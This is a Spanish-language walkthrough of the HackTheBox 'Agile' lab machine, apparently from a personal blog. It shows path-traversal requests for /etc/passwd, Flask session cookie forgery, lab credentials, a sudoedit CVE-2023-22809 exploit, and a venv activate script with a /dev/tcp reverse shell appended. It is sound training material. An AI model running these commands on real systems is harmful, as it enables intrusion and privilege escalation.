+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">ssh corum@10.129.30.106
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Agile/Pasted_image_20230306155037.png"/></p>
+<h3 class="text-lg my-5 font-bold">System Enumeration</h3>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Procesos interesantes</p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Agile/Pasted_image_20230306160615.png"/></p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Archivos interesantes</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">/var/www/html/index.nginx-debian.html                                                                                                                                                 
+/app/app-testing/__pycache__/wsgi-dev.cpython-310.pyc
+/app/app-testing/tests/functional/creds.txt
+/app/app-testing/tests/functional/__pycache__/test_site_interactively.cpython-310-pytest-7.2.0.pyc
+/app/app-testing/tests/functional/test_site_interactively.py
+/app/app-testing/requirements.txt
+/app/app-testing/.pytest_cache/.gitignore
+/app/app-testing/.pytest_cache/CACHEDIR.TAG
+/app/app-testing/.pytest_cache/v/cache/stepwise
+/app/app-testing/.pytest_cache/v/cache/nodeids
+/app/app-testing/.pytest_cache/v/cache/lastfailed
+/app/app-testing/.pytest_cache/README.md
+/app/app-testing/superpass/views/__pycache__/home_views.cpython-310.pyc
+/app/app-testing/superpass/views/__pycache__/account_views.cpython-310.pyc
+/app/app-testing/superpass/views/__pycache__/vault_views.cpython-310.pyc
+/app/app-testing/superpass/views/vault_views.py
+/app/app-testing/superpass/views/home_views.py
+/app/app-testing/superpass/views/account_views.py
+/app/app-testing/superpass/__pycache__/app.cpython-310.pyc
+/app/app-testing/superpass/__pycache__/__init__.cpython-310.pyc
+</code></pre>
+<h2 class="text-2xl py-10 text-center font-bold">Privilege Escalation a Edwards</h2>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Intentamos acceder al servicio en el puerto 5555, es la misma aplicación pero corriendo como testing y localmente en el sistema Agile</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">ssh -L 8080:localhost:5555 corum@10.10.11.203
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Nos registramos con un usuario e intentamos acceder a los recursos del sistema, pero no podemos.</p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Tomamos nuestra cookie y vemos que el id asignado es el 2</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">flask-unsign --secret MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD --decode --cookie .eJzdkEuKwzAQRK8iem0G_WypfYrZDyF0t1qxwUkGy1mF3H005BZZFUXVg6KecK4btUUbzD9PMEcXuGprdFEY4HtTamq2-8WsN3PcDYn00BzL2sxv73zB6TV8OHca-km7tgXmY39od2uBGWohVOUg_4yrJUqxit4RyySaslrCgjVb69FLsM5LFnaxUmYq6JE1jNHjhGlErgm1YsLIYeRErogLk-TkvDIWh8EJ5ynXalO0Ghltn39-NN3fazy8_gAATZH3.ZAn1Rg.T8uAe8cVXAmBs1AoJY-LcqIjJHc
+</code></pre>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">{&#x27;_flashes&#x27;: [(&#x27;message&#x27;, &#x27;Please log in to access this page.&#x27;), (&#x27;message&#x27;, &#x27;Please log in to access this page.&#x27;), (&#x27;message&#x27;, &#x27;Please log in to access this page.&#x27;), (&#x27;message&#x27;, &#x27;Please log in to access this page.&#x27;), (&#x27;message&#x27;, &#x27;Please log in to access this page.&#x27;)], &#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90&#x27;, &#x27;_user_id&#x27;: &#x27;2&#x27;}
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Asumimos que la SECRET_KEY es la misma e intentamos crear una sesion con el id 1</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">flask-unsign --sign --cookie &quot;{&#x27;_flashes&#x27;: [(&#x27;message&#x27;, &#x27;Please log in to access this page.&#x27;), (&#x27;message&#x27;, &#x27;Please log in to access this page.&#x27;)], &#x27;_fresh&#x27;: True, &#x27;_id&#x27;: &#x27;fda9eeb3cacce1fd4cd0e921abc6ce78e0a9d9f800292c3012c8cb14fa8bad929be3542969759bf79ef9794b35b7a1dc136c8712eb9d1931cb868ff0740e4b90&#x27;, &#x27;_user_id&#x27;: &#x27;1&#x27;}&quot; -S  MNOHFl8C4WLc3DQTToeeg8ZT7WpADVhqHHXJ50bPZY6ybYKEr76jNvDfsWD 
+.eJydjkuKwzAQRK8iem0G_WypfYrZDyF0t1qxwUkGy1mF3H005AZZFUXVo-oJ57pRW7TB_PMEc3SBq7ZGF4UBvjelpma7X8x6M8fdkEgPzbGszfz2zhecXsOH3Gno47u2BeZjf2h3a4EZaiFU5SD_jKslSrGK3hHLJJqyWsKCNVvr0UuwzksWdrFSZirokTWM0eOEaUSuCbViwshh5ESuiAuT5OS8MhaHwQnnKddqU7QaGW2_f3403d9vHLz-APu_WkA.ZAYrig.VWDh3LEQeurRSGRbKa66sTMRUPA
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Logramos acceder a las credenciales del usuario edwards</p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Agile/Pasted_image_20230309120804.png"/></p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Sus datos son:</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">edwards:d07867c6267dcb5df0af
+dedwards__:7dbfe676b6b564ce5718
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Finalmente ingresamos al sistemas a través de ssh con estas últimas credenciales</p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Agile/Pasted_image_20230309121717.png"/></p>
+<h2 class="text-2xl py-10 text-center font-bold">User Edwards Enumeration</h2>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Verificamos los permisos sudo</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">sudo -l
+</code></pre>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">[sudo] password for edwards: 
+Matching Defaults entries for edwards on agile:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User edwards may run the following commands on agile:
+    (dev_admin : dev_admin) sudoedit /app/config_test.json
+    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
+
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Con sudoedit podemos modificar un archivo protegido por el administrador</p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Intentamos acceder al archivo config_test.json</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">sudo -u dev_admin sudoedit /app/config_test.json
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">config_test.json</p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Agile/Pasted_image_20230309122920.png"/></p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">{
+    &quot;SQL_URI&quot;: &quot;mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest&quot;
+}
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Intentamos acceder al archivo creds.txt</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">sudo -u dev_admin sudoedit /app/app-testing/tests/functional/creds.txt
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Su cotenido es:</p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Agile/Pasted_image_20230309122823.png"/></p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">edwards:1d7ffjwrx#$d6qn!9nndqgde4
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Verificamos cuales son los archivos que el usuario web_admin puede modificar</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">find /  -user dev_admin 2&gt;/dev/null | xargs ls -al --color
+</code></pre>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">-rw-r----- 1 dev_admin runner      34 Mar 10 17:18 /app/app-testing/tests/functional/creds.txt
+-r--r----- 1 dev_admin www-data    88 Jan 25 00:00 /app/config_prod.json
+-r--r----- 1 dev_admin runner      99 Jan 25 15:15 /app/config_test.json
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Verificamos que puede modificar el grupo dev_admin</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">find /  -group dev_admin 2&gt;/dev/null | xargs ls -al --color
+</code></pre>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">-rw-r--r-- 1 root      dev_admin 9033 Mar 10 17:21 /app/venv/bin/Activate.ps1
+-rw-rw-r-- 1 root      dev_admin 1976 Mar 10 17:21 /app/venv/bin/activate
+-rw-r--r-- 1 root      dev_admin  902 Mar 10 17:21 /app/venv/bin/activate.csh
+-rw-r--r-- 1 root      dev_admin 2044 Mar 10 17:21 /app/venv/bin/activate.fish
+
+/app/venv:
+total 24
+drwxrwxr-x 5 root dev_admin 4096 Feb  8 16:29 .
+drwxr-xr-x 6 root root      4096 Feb  8 16:29 ..
+drwxrwxr-x 2 root dev_admin 4096 Mar 10 17:21 bin
+drwxrwxr-x 3 root root      4096 Feb  8 16:29 include
+drwxrwxr-x 3 root root      4096 Feb  8 16:29 lib
+lrwxrwxrwx 1 root root         3 Jan 25 17:21 lib64 -&gt; lib
+-rw-rw-r-- 1 root root        70 Jan 25 17:21 pyvenv.cfg
+
+/app/venv/bin:
+total 1380
+drwxrwxr-x 2 root dev_admin    4096 Mar 10 17:21 .
+drwxrwxr-x 5 root dev_admin    4096 Feb  8 16:29 ..
+-rw-r--r-- 1 root dev_admin    9033 Mar 10 17:21 Activate.ps1
+-rw-rw-r-- 1 root dev_admin    1976 Mar 10 17:21 activate
+-rw-r--r-- 1 root dev_admin     902 Mar 10 17:21 activate.csh
+-rw-r--r-- 1 root dev_admin    2044 Mar 10 17:21 activate.fish
+-rwxrwxr-x 1 root root          213 Mar 10 17:21 flask
+-rwxr-xr-x 1 root root          222 Jan 24 18:06 gunicorn
+-rwxrwxr-x 1 root root          226 Mar 10 17:21 pip
+-rwxrwxr-x 1 root root          226 Mar 10 17:21 pip3
+-rwxrwxr-x 1 root root          226 Mar 10 17:21 pip3.10
+-rwxrwxr-x 1 root root          226 Mar 10 17:21 py.test
+-rwxrwxr-x 1 root root          226 Mar 10 17:21 pytest
+lrwxrwxrwx 1 root root            7 Mar 10 17:21 python -&gt; python3
+lrwxrwxrwx 1 root root           16 Mar 10 17:21 python3 -&gt; /usr/bin/python3
+lrwxrwxrwx 1 root root            7 Mar 10 17:21 python3.10 -&gt; python3
+-rwxrwxr-x 1 root root      1349984 Jan 23 21:45 uwsgi
+ls: cannot open directory &#x27;/home/dev_admin&#x27;: Permission denied
+
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Para comprender mayormente el sistema revisamos el script test_and_update.sh</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">#!/bin/bash
+
+# update prod with latest from testing constantly assuming tests are passing
+
+echo &quot;Starting test_and_update&quot;
+date
+
+# if already running, exit
+ps auxww | grep -v &quot;grep&quot; | grep -q &quot;pytest&quot; &amp;&amp; exit
+
+echo &quot;Not already running. Starting...&quot;
+
+# start in dev folder
+cd /app/app-testing
+
+# system-wide source doesn&#x27;t seem to happen in cron jobs
+source /app/venv/bin/activate
+
+# run tests, exit if failure
+pytest -x 2&gt;&amp;1 &gt;/dev/null || exit
+
+# tests good, update prod (flask debug mode will load it instantly)
+cp -r superpass /app/app/
+echo &quot;Complete!&quot;
+
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Básicamente lo que hace es validar la aplicación con un conjunto de pruebas, si estas prueabas son aprobadas, la aplicación es copiada en la carpeta /app y pasa a producción. Vemos que el script usa el archivo  /app/venv/bin/activate. Además, el usuario dev_admin tiene permisos de grupo para escribir sobre el.</p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Intentaremos que el script source /app/venv/bin/activate quede de la siguiente forma (añadimos una shell reversa al final del script)</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400"># This file must be used with &quot;source bin/activate&quot; *from bash*
+# you cannot run it directly
+
+deactivate () {
+    # reset old environment variables
+    if [ -n &quot;${_OLD_VIRTUAL_PATH:-}&quot; ] ; then
+        PATH=&quot;${_OLD_VIRTUAL_PATH:-}&quot;
+        export PATH
+        unset _OLD_VIRTUAL_PATH
+    fi
+    if [ -n &quot;${_OLD_VIRTUAL_PYTHONHOME:-}&quot; ] ; then
+        PYTHONHOME=&quot;${_OLD_VIRTUAL_PYTHONHOME:-}&quot;
+        export PYTHONHOME
+        unset _OLD_VIRTUAL_PYTHONHOME
+    fi
+
+    # This should detect bash and zsh, which have a hash command that must
+    # be called to get it to forget past commands.  Without forgetting
+    # past commands the $PATH changes we made may not be respected
+    if [ -n &quot;${BASH:-}&quot; -o -n &quot;${ZSH_VERSION:-}&quot; ] ; then
+        hash -r 2&gt; /dev/null
+    fi
+
+    if [ -n &quot;${_OLD_VIRTUAL_PS1:-}&quot; ] ; then
+        PS1=&quot;${_OLD_VIRTUAL_PS1:-}&quot;
+        export PS1
+        unset _OLD_VIRTUAL_PS1
+    fi
+
+    unset VIRTUAL_ENV
+    unset VIRTUAL_ENV_PROMPT
+    if [ ! &quot;${1:-}&quot; = &quot;nondestructive&quot; ] ; then
+    # Self destruct!
+        unset -f deactivate
+    fi
+}
+
+# unset irrelevant variables
+deactivate nondestructive
+
+VIRTUAL_ENV=&quot;/app/venv&quot;
+export VIRTUAL_ENV
+
+_OLD_VIRTUAL_PATH=&quot;$PATH&quot;
+PATH=&quot;$VIRTUAL_ENV/bin:$PATH&quot;
+export PATH
+
+# unset PYTHONHOME if set
+# this will fail if PYTHONHOME is set to the empty string (which is bad anyway)
+# could use `if (set -u; : $PYTHONHOME) ;` in bash
+if [ -n &quot;${PYTHONHOME:-}&quot; ] ; then
+    _OLD_VIRTUAL_PYTHONHOME=&quot;${PYTHONHOME:-}&quot;
+    unset PYTHONHOME
+fi
+
+if [ -z &quot;${VIRTUAL_ENV_DISABLE_PROMPT:-}&quot; ] ; then
+    _OLD_VIRTUAL_PS1=&quot;${PS1:-}&quot;
+    PS1=&quot;(venv) ${PS1:-}&quot;
+    export PS1
+    VIRTUAL_ENV_PROMPT=&quot;(venv) &quot;
+    export VIRTUAL_ENV_PROMPT
+fi
+
+# This should detect bash and zsh, which have a hash command that must
+# be called to get it to forget past commands.  Without forgetting
+# past commands the $PATH changes we made may not be respected
+if [ -n &quot;${BASH:-}&quot; -o -n &quot;${ZSH_VERSION:-}&quot; ] ; then
+    hash -r 2&gt; /dev/null
+fi
+0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.10.14.118/4242; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196
+
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Verificamos la versión de sudo</p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Agile/Pasted_image_20230311000023.png"/></p>
+<h2 class="text-2xl py-10 text-center font-bold">Elevación de Privilegios</h2>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Para escalar privilegios usamos una vulnerabilidad de sudoedit, especificamente esta:</p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto"><a href="CVE-2023-22809" class="mdx-p inline-block mb-4 text-xs font-bold capitalize border-b-2 border-orange-600 hover:text-orange-600">CVE-2023-22809</a>
+<a href="Detalles de vulnerabilidad" class="mdx-p inline-block mb-4 text-xs font-bold capitalize border-b-2 border-orange-600 hover:text-orange-600">Detalles de vulnerabilidad</a></p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">En base al exploit creamos la siguiente variable de  entorno</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">export EDITOR=vim -- /app/venv/bin/activate
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Luego intentamos modificar el archivo creds.txt</p>
+<pre class=" mb-5 rounded-md p-10 bg-gray-800 overflow-x-auto "><code class="text-green-400">sudoedit -g dev_admin -u dev_admin /app/app-testing/tests/functional/creds.txt
+</code></pre>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Agregamos la linea para nuestra reverse shell</p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Agile/Pasted_image_20230311000753.png"/></p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Guardamos</p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Agile/Pasted_image_20230311000618.png"/></p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Usamos netcat para esuchar alguna conexión en el puerto 4242 y esperamos unos minutos</p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto"><img alt="" loading="lazy" width="400" height="200" decoding="async" data-nimg="1" style="color:transparent;width:auto;height:auto;margin-left:auto;margin-right:auto" src="/nextjs-github-pages/Agile/Pasted_image_20230310235255.png"/></p>
+<p class="mdx-p text-justify mx-2.5 hyphens-auto">Finalmente obtenemos acceso al sistema como root</p></div></main><footer class="bg-white border-t border-l  "><div class="flex"><div class="w-full text-center p-1"><h6 class="font-semibold text-gray-700 mb-4">A Simple Github Blog - 2024</h6></div></div></footer></div></div><script id="__NEXT_DATA__" type="application/json" crossorigin="">{"props":{"pageProps":{"markdownData":"{\"orig\":\"---\\ntitle: HackTheBox - Maquina Agile \\nsubtitle: Paso a paso de la explotación de la máquina Agile de HackTheBox.\\ndificultad: Medium\\nos: Sistema Operativo Linux\\ndate: 2024-02-10\\ntags:\\n    - HackTheBox\\n---\\n\\n## Enumeración de puertos\\n\\n### TCP \\n\\nEnumeracion de Puertos TCP\\n\\n~~~ bash\\nnmap -p- -A 10.129.30.106\\nStarting Nmap 7.92 ( https://nmap.org ) at 2023-03-06 09:14 EST\\nNmap scan report for 10.129.30.106\\nHost is up (0.15s latency).\\nNot shown: 65533 closed tcp ports (conn-refused)\\nPORT   STATE SERVICE VERSION\\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)\\n| ssh-hostkey: \\n|   256 f4:bc:ee:21:d7:1f:1a:a2:65:72:21:2d:5b:a6:f7:00 (ECDSA)\\n|_  256 65:c1:48:0d:88:cb:b9:75:a0:2c:a5:e6:37:7e:51:06 (ED25519)\\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\\n|_http-title: Did not follow redirect to http://superpass.htb\\n|_http-server-header: nginx/1.18.0 (Ubuntu)\\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\\n\\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\\nNmap done: 1 IP address (1 host up) scanned in 502.76 seconds\\n~~~\\n\\n\\n\\n### UDP\\n  \\nEnumeración de puertos UDP\\n\\n~~~ bash\\nsudo nmap -F -sU 10.129.30.106\\n[sudo] password for kali: \\nStarting Nmap 7.92 ( https://nmap.org ) at 2023-03-06 09:32 EST\\nNmap scan report for agile.htb (10.129.30.106)\\nHost is up (0.15s latency).\\nNot shown: 99 closed udp ports (port-unreach)\\nPORT   STATE         SERVICE\\n68/udp open|filtered dhcpc\\n\\nNmap done: 1 IP address (1 host up) scanned in 106.72 seconds\\n~~~\\n\\n\\n## Enumeracion de Servicios     \\n\\n### Puerto 80\\n\\nDefinimos el subdominio superpass.htb (este es visible en el título de la página de Nginx, tambien visible en los resultados de nmap)\\n\\n![](/Agile/Pasted_image_20230306113515.png)\\n\\nIntentamos registrarnos en la aplicacion web\\n\\n![](/Agile/Pasted_image_20230306114025.png)\\n\\nAl intentarlo obtenemos el siguiente error\\n\\n![](/Agile/Pasted_image_20230306113616.png)\\n\\nLuego de registrarnos ingresamos a la siguiente página\\n\\nPodemos ingresar algunas credenciales al baul.Intentamos exportarlas\\n\\nLuego intentamos extraer archivos interesantes de información, como el archivo (etc/passwd)\\n\\n~~~http\\nGET /download?fn=../../etc/passwd HTTP/1.1\\nHost: superpass.htb\\nUpgrade-Insecure-Requests: 1\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nAccept-Encoding: gzip, deflate\\nAccept-Language: en-US,en;q=0.9\\nCookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e\\nConnection: close\\n~~~\\n\\n~~~http\\nHTTP/1.1 200 OK\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 14:51:57 GMT\\nContent-Type: text/csv; charset=utf-8\\nContent-Length: 1744\\nConnection: close\\nContent-Disposition: attachment; filename=superpass_export.csv\\nVary: Cookie\\n\\nroot:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\\nsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\\nmessagebus:x:103:104::/nonexistent:/usr/sbin/nologin\\nsystemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\\npollinate:x:105:1::/var/cache/pollinate:/bin/false\\nsshd:x:106:65534::/run/sshd:/usr/sbin/nologin\\nusbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\\ncorum:x:1000:1000:corum:/home/corum:/bin/bash\\ndnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\\nmysql:x:109:112:MySQL Server,,,:/nonexistent:/bin/false\\nrunner:x:1001:1001::/app/app-testing/:/bin/sh\\nedwards:x:1002:1002::/home/edwards:/bin/bash\\ndev_admin:x:1003:1003::/home/dev_admin:/bin/bash\\n_laurel:x:999:999::/var/log/laurel:/bin/false\\n~~~\\n\\nConsultamos las variables de entorno del sistema\\n\\n~~~http\\nGET /download?fn=../../proc/self/environ HTTP/1.1\\nHost: superpass.htb\\nUpgrade-Insecure-Requests: 1\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nAccept-Encoding: gzip, deflate\\nAccept-Language: en-US,en;q=0.9\\nCookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e\\nConnection: close\\n~~~\\n\\n![](/Agile/Pasted_image_20230306121100.png)\\n\\nBuscamos el directorio /app/config_prod.json\\n\\n~~~http\\nGET /download?fn=../../home/dev_admin/app/config_prod.json HTTP/1.1\\nHost: superpass.htb\\nUpgrade-Insecure-Requests: 1\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\nAccept-Encoding: gzip, deflate\\nAccept-Language: en-US,en;q=0.9\\nCookie: session=.eJwljk1qAzEMha9itA7Fsj1jK6fovoQgyXJmYNqE8WQVcve6dPV4vB--F1zbxn2xDuevF7hjCHxb73wzOMHnZtzNbfebW3_ccXesOkJ3LGt3j9H5gMv7chonu_UFzsf-tOHWCmdolclMov5tsNWk1RsFZNFZLRfzTJVa8T5Q0OgxaFHB1LgIVwokFqcUaKY8kbRM1ihTkjhJZqyKcdaSMZhQRYqoUubSms_JWxLyA__67Lb_06CH9y8M9kfe.ZAX9Ow.fH2yxQcz3IpceX-8l2pwRttG9Uk; remember_token=11|a91ce8f326a4f9f0a8529318e8bb45fb40d8b5747b727b7815fddf9f7d74fd4414370eed6fdcd69074041975f71e52a5cbe305cfc06715ace1b48a7238f3841e\\nConnection: close\\n~~~\\n\\nNo tenemos acceso al archivo pero encontramos un campo llamado secret en la respuesta\\n\\n~~~http\\nHTTP/1.1 500 INTERNAL SERVER ERROR\\nServer: nginx/1.18.0 (Ubuntu)\\nDate: Mon, 06 Mar 2023 15:15:35 GMT\\nContent-Type: text/html; charset=utf-8\\nContent-Length: 13637\\nConnection: close\\n\\n\u003c!doctype html\u003e\\n\u003chtml lang=en\u003e\\n  \u003chead\u003e\\n    \u003ctitle\u003ePermissionError: [Errno 13] Permission denied: '/tmp/../../home/dev_admin/app/config_prod.json'\\n // Werkzeug Debugger\u003c/title\u003e\\n    \u003clink 